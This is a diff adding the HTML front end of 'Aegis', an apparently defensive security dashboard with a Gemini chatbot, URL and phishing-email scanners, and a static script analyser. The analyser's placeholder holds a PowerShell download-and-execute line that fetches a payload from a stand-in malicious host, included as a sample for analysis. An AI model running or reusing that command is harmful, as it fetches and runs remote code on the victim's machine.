@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Aegis // Cyber Security Intelligence & Threat Prevention Hub</title>
+  <!-- Google Fonts for Scientific Aesthetic -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+  <!-- FontAwesome Icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <!-- Marked Markdown Parser -->
+  <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+  <!-- Application Stylesheet -->
+  <link rel="stylesheet" href="/styles.css">
+</head>
+<body>
+  <!-- Scientific Grid Background & Hex Overlay -->
+  <div class="sci-grid"></div>
+  <div class="sci-overlay"></div>
+
+  <!-- Main Dashboard Container -->
+  <div class="dashboard-container">
+    
+    <!-- Sidebar Navigation -->
+    <aside class="sidebar">
+      <div class="logo-area">
+        <div class="logo-icon">
+          <i class="fa-solid fa-shield-halved"></i>
+          <div class="logo-pulse"></div>
+        </div>
+        <div class="logo-text">
+          <span class="logo-title">AEGIS</span>
+          <span class="logo-subtitle">SECURE v2.5</span>
+        </div>
+      </div>
+
+      <nav class="nav-menu">
+        <button class="nav-item active" data-target="chat-view">
+          <i class="fa-solid fa-message-bot"></i>
+          <span>Aegis Intelligence</span>
+        </button>
+        <button class="nav-item" data-target="url-view">
+          <i class="fa-solid fa-globe"></i>
+          <span>URL Risk Scanner</span>
+        </button>
+        <button class="nav-item" data-target="email-view">
+          <i class="fa-solid fa-envelope-open-text"></i>
+          <span>Email Threat Audit</span>
+        </button>
+        <button class="nav-item" data-target="script-view">
+          <i class="fa-solid fa-terminal"></i>
+          <span>Malware Sandbox</span>
+        </button>
+        <button class="nav-item" data-target="settings-view">
+          <i class="fa-solid fa-sliders"></i>
+          <span>System Config</span>
+        </button>
+      </nav>
+
+      <div class="status-panel">
+        <div class="status-indicator">
+          <span class="dot pulse-green"></span>
+          <span class="status-lbl">System Online</span>
+        </div>
+        <div class="api-status-badge text-glow" id="api-status-badge">
+          <i class="fa-solid fa-key-skeleton"></i> NO API KEY
+        </div>
+      </div>
+    </aside>
+
+    <!-- Main Content Area -->
+    <main class="main-content">
+      
+      <!-- Top Status Header Bar -->
+      <header class="top-header">
+        <div class="header-title">
+          <h1 id="view-title">Aegis Intelligence Chatbot</h1>
+          <p id="view-desc" class="view-description">Cognitive threat prevention & general security assistant</p>
+        </div>
+        
+        <div class="header-widgets">
+          <div class="header-stat">
+            <span class="stat-lbl">THREAT INDEX</span>
+            <span class="stat-val val-safe" id="threat-index-val">NOMINAL</span>
+          </div>
+          <div class="header-stat">
+            <span class="stat-lbl">SANDBOX ISOLATION</span>
+            <span class="stat-val text-blue">ENABLED</span>
+          </div>
+          <div class="header-stat api-key-status-widget" id="header-key-widget">
+            <span class="stat-lbl">GEMINI v2.5</span>
+            <span class="stat-val status-key-miss" id="header-key-lbl">DISCONNECTED</span>
+          </div>
+        </div>
+      </header>
+
+      <!-- View Containers -->
+      <div class="views-wrapper">
+
+        <!-- 1. CHAT / AEGIS INTELLIGENCE VIEW -->
+        <section id="chat-view" class="view-panel active">
+          <div class="chat-container">
+            <!-- Chat Feed -->
+            <div class="chat-feed" id="chat-feed">
+              <!-- System Welcome Message -->
+              <div class="chat-msg system-msg">
+                <div class="msg-avatar">
+                  <i class="fa-solid fa-robot"></i>
+                </div>
+                <div class="msg-bubble">
+                  <div class="sci-decor-bar"></div>
+                  <div class="msg-sender">AEGIS THREAT MONITOR</div>
+                  <div class="msg-body">
+                    <p>Welcome to <strong>Aegis Security Intelligence Platform</strong>. I am your cognitive virtual analyst initialized with active response subroutines.</p>
+                    <p>I can help you:</p>
+                    <ul>
+                      <li>Identify social engineering and phishing tactics.</li>
+                      <li>Explain complex vulnerabilities and ransomware protocols.</li>
+                      <li>Provide immediate action plans in case of credential leaks or system intrusion.</li>
+                    </ul>
+                    <p class="sci-notice"><i class="fa-solid fa-triangle-exclamation"></i> <strong>SYSTEM NOTE:</strong> Please configure your Gemini API Key in the <strong>System Config</strong> tab to begin active communications.</p>
+                  </div>
+                  <span class="msg-time" id="welcome-time">12:30:14</span>
+                </div>
+              </div>
+            </div>
+
+            <!-- Suggestion Prompts Grid -->
+            <div class="suggestions-grid" id="chat-suggestions">
+              <button class="suggest-btn" data-prompt="What are the immediate steps if I clicked on a suspicious phishing link?">
+                <i class="fa-solid fa-link-slash"></i>
+                <span>Phishing Link Response Plan</span>
+              </button>
+              <button class="suggest-btn" data-prompt="How do I verify if an email from 'support@paypal-security-update.com' is legitimate?">
+                <i class="fa-solid fa-magnifying-glass-chart"></i>
+                <span>Verify Email Legitimacy</span>
+              </button>
+              <button class="suggest-btn" data-prompt="Explain the difference between spear phishing and ransomware.">
+                <i class="fa-solid fa-shield-virus"></i>
+                <span>Phishing vs Ransomware</span>
+              </button>
+              <button class="suggest-btn" data-prompt="What are the best practices to secure my home router and WiFi from local attacks?">
+                <i class="fa-solid fa-wifi"></i>
+                <span>WiFi Network Hardening</span>
+              </button>
+            </div>
+
+            <!-- Typing indicator -->
+            <div class="typing-indicator-wrapper" id="typing-indicator" style="display: none;">
+              <div class="typing-indicator">
+                <span></span>
+                <span></span>
+                <span></span>
+              </div>
+              <span class="typing-text">Aegis is analyzing threat profiles...</span>
+            </div>
+
+            <!-- Input Bar -->
+            <div class="chat-input-bar">
+              <textarea class="chat-input" id="chat-input" placeholder="Query Aegis Intelligence (e.g. 'How do I spot phishing?')" rows="1"></textarea>
+              <button class="send-btn" id="send-btn" title="Send Message">
+                <i class="fa-solid fa-paper-plane-top"></i>
+              </button>
+            </div>
+          </div>
+        </section>
+
+        <!-- 2. URL RISK SCANNER VIEW -->
+        <section id="url-view" class="view-panel">
+          <div class="split-view">
+            <div class="form-pane card-panel">
+              <div class="card-header">
+                <h3><i class="fa-solid fa-link"></i> URL Inspection Input</h3>
+                <div class="sci-line"></div>
+              </div>
+              <p class="pane-instruction">Enter any suspicious web link, URL, or domain. Aegis will parse it for lexical indicators of spoofing, suspicious TLDs, and request Gemini to analyze it for phishing indicators.</p>
+              
+              <div class="input-group">
+                <label for="url-scan-input">SUSPICIOUS URL</label>
+                <div class="input-with-action">
+                  <input type="text" id="url-scan-input" placeholder="https://secure-login.paypal-update-account.com/signin" autocomplete="off">
+                  <button class="clear-btn" id="url-clear-btn" title="Clear input"><i class="fa-solid fa-xmark"></i></button>
+                </div>
+              </div>
+
+              <div class="scanner-actions">
+                <button class="action-btn primary-btn" id="url-scan-btn">
+                  <i class="fa-solid fa-radar"></i> RUN RISK RADAR
+                </button>
+              </div>
+
+              <div class="lexical-indicators" id="lexical-indicators-box" style="display: none;">
+                <h4>Lexical Analysis Flags</h4>
+                <ul class="flag-list" id="lexical-flag-list">
+                  <!-- JS injected flags -->
+                </ul>
+              </div>
+            </div>
+
+            <div class="results-pane card-panel">
+              <div class="card-header">
+                <h3><i class="fa-solid fa-chart-simple"></i> Threat Level Analysis</h3>
+                <div class="sci-line"></div>
+              </div>
+              
+              <div class="threat-meter-box">
+                <div class="threat-gauge">
+                  <svg viewBox="0 0 100 50" class="gauge-svg">
+                    <path class="gauge-bg" d="M 10 50 A 40 40 0 0 1 90 50" fill="none" stroke-width="8"></path>
+                    <path class="gauge-fill" id="url-gauge-fill" d="M 10 50 A 40 40 0 0 1 90 50" fill="none" stroke-width="8" stroke-dasharray="126" stroke-dashoffset="126"></path>
+                  </svg>
+                  <div class="gauge-label" id="url-gauge-lbl">NOMINAL</div>
+                  <div class="gauge-percentage" id="url-gauge-pct">0%</div>
+                </div>
+                <div class="meter-stats">
+                  <div class="meter-stat">
+                    <span>RISK RATING:</span>
+                    <strong id="url-risk-lvl">UNKNOWN</strong>
+                  </div>
+                  <div class="meter-stat">
+                    <span>VERDICT:</span>
+                    <strong id="url-verdict">AWAITING INPUT</strong>
+                  </div>
+                </div>
+              </div>
+
+              <div class="report-box" id="url-report-box">
+                <div class="report-placeholder">
+                  <i class="fa-solid fa-magnifying-glass-arrow-right"></i>
+                  <p>Execute Risk Radar to compile real-time AI security reports.</p>
+                </div>
+                <div class="report-content" id="url-report-content" style="display: none;">
+                  <!-- Injected by JS -->
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- 3. EMAIL THREAT AUDIT VIEW -->
+        <section id="email-view" class="view-panel">
+          <div class="split-view">
+            <div class="form-pane card-panel">
+              <div class="card-header">
+                <h3><i class="fa-solid fa-shield-virus"></i> Message Analysis Engine</h3>
+                <div class="sci-line"></div>
+              </div>
+              <p class="pane-instruction">Paste the full text of any suspicious email, SMS, or direct message you received. The engine will evaluate structural language cues (urgency, spoofing requests) and run threat modeling.</p>
+
+              <div class="input-group">
+                <label for="email-audit-input">MESSAGE BODY / TEXT Content</label>
+                <textarea id="email-audit-input" rows="10" placeholder="Dear Customer, 
+
+We noticed a suspicious login attempt on your account from IP 192.168.1.100. If this wasn't you, please immediately update your credentials within 24 hours at the link below or your account will be permanently deactivated.
+
+Link: http://verify-my-account-now.com/login
+
+Regards,
+Security Department" class="custom-textarea"></textarea>
+              </div>
+
+              <div class="scanner-actions">
+                <button class="action-btn primary-btn" id="email-audit-btn">
+                  <i class="fa-solid fa-arrows-spin"></i> AUDIT COMMUNICATIONS
+                </button>
+              </div>
+            </div>
+
+            <div class="results-pane card-panel">
+              <div class="card-header">
+                <h3><i class="fa-solid fa-rectangle-list"></i> Threat Audit Report</h3>
+                <div class="sci-line"></div>
+              </div>
+
+              <div class="threat-meter-box">
+                <div class="threat-gauge">
+                  <svg viewBox="0 0 100 50" class="gauge-svg">
+                    <path class="gauge-bg" d="M 10 50 A 40 40 0 0 1 90 50" fill="none" stroke-width="8"></path>
+                    <path class="gauge-fill" id="email-gauge-fill" d="M 10 50 A 40 40 0 0 1 90 50" fill="none" stroke-width="8" stroke-dasharray="126" stroke-dashoffset="126"></path>
+                  </svg>
+                  <div class="gauge-label" id="email-gauge-lbl">NOMINAL</div>
+                  <div class="gauge-percentage" id="email-gauge-pct">0%</div>
+                </div>
+                <div class="meter-stats">
+                  <div class="meter-stat">
+                    <span>SOCIAL ENG SCORE:</span>
+                    <strong id="email-risk-lvl">0 / 10</strong>
+                  </div>
+                  <div class="meter-stat">
+                    <span>URGENCY LEVEL:</span>
+                    <strong id="email-urgency-lbl">NONE DETECTED</strong>
+                  </div>
+                </div>
+              </div>
+
+              <div class="report-box" id="email-report-box">
+                <div class="report-placeholder">
+                  <i class="fa-solid fa-envelope-open-text"></i>
+                  <p>Execute audit subroutines to extract cognitive social engineering indicators.</p>
+                </div>
+                <div class="report-content" id="email-report-content" style="display: none;">
+                  <!-- Injected by JS -->
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- 4. MALWARE SANDBOX VIEW -->
+        <section id="script-view" class="view-panel">
+          <div class="split-view">
+            <div class="form-pane card-panel">
+              <div class="card-header">
+                <h3><i class="fa-solid fa-terminal"></i> Script Sandboxing & Auditing</h3>
+                <div class="sci-line"></div>
+              </div>
+              <p class="pane-instruction">Paste scripts (PowerShell, VBA, Bash, Python, JS) to parse them for malicious behaviors (obfuscation, network callbacks, memory injections) in a secure, non-execution environment.</p>
+
+              <div class="input-grid">
+                <div class="input-group">
+                  <label for="script-lang">LANGUAGE SELECT</label>
+                  <select id="script-lang" class="custom-select">
+                    <option value="powershell">PowerShell (.ps1)</option>
+                    <option value="bash">Bash Script (.sh)</option>
+                    <option value="python">Python Script (.py)</option>
+                    <option value="javascript">JavaScript / Node.js (.js)</option>
+                    <option value="vba">VBA Macro / Office Macro (.vbs / .bas)</option>
+                    <option value="unknown">Auto-Detect Language</option>
+                  </select>
+                </div>
+              </div>
+
+              <div class="input-group">
+                <label for="script-input">SOURCE CODE</label>
+                <div class="code-editor-wrapper">
+                  <div class="line-numbers" id="editor-lines">1</div>
+                  <textarea id="script-input" rows="12" placeholder="iex (New-Object Net.WebClient).DownloadString('http://malicious-domain.ru/payload.ps1')" class="code-textarea" spellcheck="false"></textarea>
+                </div>
+              </div>
+
+              <div class="scanner-actions">
+                <button class="action-btn primary-btn" id="script-scan-btn">
+                  <i class="fa-solid fa-microchip"></i> DECOMPILE & ANALYZE
+                </button>
+              </div>
+            </div>
+
+            <div class="results-pane card-panel">
+              <div class="card-header">
+                <h3><i class="fa-solid fa-bug-slash"></i> Malware Report</h3>
+                <div class="sci-line"></div>
+              </div>
+
+              <div class="static-signatures" id="signatures-box" style="display: none;">
+                <h4>Static Indicators Found</h4>
+                <div class="sig-badges" id="sig-badges-list">
+                  <!-- Badges inserted by JS -->
+                </div>
+              </div>
+
+              <div class="report-box" id="script-report-box">
+                <div class="report-placeholder">
+                  <i class="fa-solid fa-code-compare"></i>
+                  <p>Execute sandbox auditor to output static heuristics and AI structural reviews.</p>
+                </div>
+                <div class="report-content" id="script-report-content" style="display: none;">
+                  <!-- Injected by JS -->
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- 5. SETTINGS / CONFIG VIEW -->
+        <section id="settings-view" class="view-panel">
+          <div class="settings-container card-panel">
+            <div class="card-header">
+              <h3><i class="fa-solid fa-screwdriver-wrench"></i> Aegis API Configurations</h3>
+              <div class="sci-line"></div>
+            </div>
+
+            <div class="settings-form">
+              <div class="sci-alert warning-alert">
+                <i class="fa-solid fa-circle-info"></i>
+                <div class="alert-txt">
+                  <strong>API Key Storage Security Notice:</strong>
+                  Your Gemini API Key is stored directly inside your browser's private local storage (<code>localStorage</code>) and is sent directly and exclusively to <code>generativelanguage.googleapis.com</code> via secure HTTPS requests. No third-party servers see your key.
+                </div>
+              </div>
+
+              <div class="input-group">
+                <label for="gemini-key-input">GOOGLE GEMINI DEVELOPER API KEY</label>
+                <div class="api-key-field-wrapper">
+                  <input type="password" id="gemini-key-input" placeholder="AIzaSy..." class="custom-input key-field">
+                  <button class="toggle-visibility-btn" id="toggle-key-visibility" title="Toggle visibility">
+                    <i class="fa-solid fa-eye"></i>
+                  </button>
+                </div>
+                <span class="input-help">Need an API key? You can get a free one in seconds at the <a href="https://aistudio.google.com/" target="_blank" rel="noopener noreferrer">Google AI Studio <i class="fa-solid fa-arrow-up-right-from-square"></i></a> page.</span>
+              </div>
+
+              <div class="settings-actions">
+                <button class="action-btn success-btn" id="save-key-btn">
+                  <i class="fa-solid fa-circle-check"></i> SAVE CONFIG & ESTABLISH LINK
+                </button>
+                <button class="action-btn danger-btn" id="clear-key-btn">
+                  <i class="fa-solid fa-trash-can"></i> REMOVE KEY
+                </button>
+              </div>
+
+              <div class="diagnostic-box" id="diagnostic-box" style="display: none;">
+                <h4>Connection Diagnostic Logs</h4>
+                <pre class="terminal-log" id="diagnostic-logs">Initializing link diagnostic...</pre>
+              </div>
+            </div>
+          </div>
+        </section>
+
+      </div>
+    </main>
+  </div>
+
+  <!-- Main JavaScript Logic -->
+  <script src="/app.js" type="module"></script>
+</body>
+</html>
